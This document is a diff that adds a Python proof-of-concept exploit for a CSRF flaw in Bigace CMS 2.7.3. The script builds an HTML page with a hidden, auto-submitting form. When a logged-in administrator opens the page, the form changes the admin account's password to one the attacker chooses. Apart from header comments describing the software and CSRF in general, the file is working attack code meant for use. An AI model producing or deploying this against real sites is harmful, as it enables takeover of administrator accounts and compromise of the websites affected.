@@ -1,0 +1,42 @@
+#!/usr/bin/python
+#Exploit Title : Bigace_2.7.3 CSRF Change admin password POC 
+#Software : Bigace 2.7.3
+#Software link : http://www.bigace.de/download.html
+#Autor : Sweet
+#Email : charif38@hotmail.fr
+#Date  : 26/10/2010
+#Software version : 2.7.3
+#Software detail: BIGACE - Dynamic Web CMS - is a free, professional grade software package that allows you to set up your own Website within minutes.
+#                 Its powerful backend puts you in full control of the layout, service and content of your Pages. 
+#                 BIGACE is written in the popular language PHP and uses a MySQL database. It is designed to provide #you with all the features you 
+#                 need from a CMS while having an absolute minimal impact on the resources of the server.
+#Vulnerability detail: Also known as a one-click attack or session riding and abbreviated as CSRF or XSRF, is a type of malicious exploit of a website 
+#                      whereby unauthorized commands are transmitted from a user that the website trusts. 
+#                      Unlike cross-site scripting (XSS), which exploits the trust a user has for a particular site, CSRF exploits the trust that a site has in a user's browser.
+#                      int two word you need the cookie of the user that you wanna attack
+#thx to  Heni Kraiem , Milw0rm.com , JF - Hamst0r - Keystroke) R.I.P  , inj3ct0r.com ,  exploit-db.com, packetstormsecurity.org, http://ha.ckers.org
+#et 1,2,3 viva L'Algerie
+import sys
+if len(sys.argv) != 3:
+      print """Usage:
+                ./exploit.py <Url and bigace patch> <Your new password>
+                Example:
+               ./exploit.py http://172.16.233.128:80/bigacecms/ mypassword """
+      quit()
+url = sys.argv[1]
+passw = sys.argv[2]
+Skel ="""<body onload="document.getElementById('1').submit()">
+<form method="POST" id="1" name="form0" action="%spublic/index.php?cmd=admin&id=userAdmin_tADMIN_len">
+<input type="hidden" name="mode" value="changePassword"/>
+<input type="hidden" name="data[id]" value="1"/>
+<input type="hidden" name="passwordnew" value="%s"/> 
+<input type="hidden" name="passwordcheck" value="%s"/> 
+</form> """ % (url,passw,passw)
+try :
+     print "[+] Writing the exploit [+]"
+     FP = file("bigaceCSRF.html" , "w")
+     FP.write(Skel)
+     FP.close()
+     print "[+] Exploit writed succesfully [+]"
+except :
+     print "[+] Error while trying to write the exploit [+]"
